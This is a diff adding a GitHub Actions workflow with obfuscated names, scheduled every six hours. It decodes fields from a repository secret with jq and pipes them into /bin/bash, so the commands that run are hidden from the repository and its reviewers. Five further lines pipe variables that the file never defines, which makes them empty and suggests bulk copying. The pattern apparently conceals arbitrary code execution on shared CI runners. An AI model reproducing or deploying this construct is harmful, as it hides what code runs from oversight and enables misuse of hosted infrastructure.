@@ -1,0 +1,22 @@
+name: tongxuevb
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongxuevb
+        env:
+          jq8: ${{ secrets.jq8 }}
+        run: |
+          echo $jq8 | jq -r .peywd99 | /bin/bash
+          echo $axwwn3 | jq -r .kpr403 | /bin/bash
+          echo $s59048 | jq -r .ntl69 | /bin/bash
+          echo $n59456 | jq -r .g8186 | /bin/bash
+          echo $awhsi6087 | jq -r .qiqr01208 | /bin/bash
+          echo $s11960 | jq -r .y2315 | /bin/bash
+
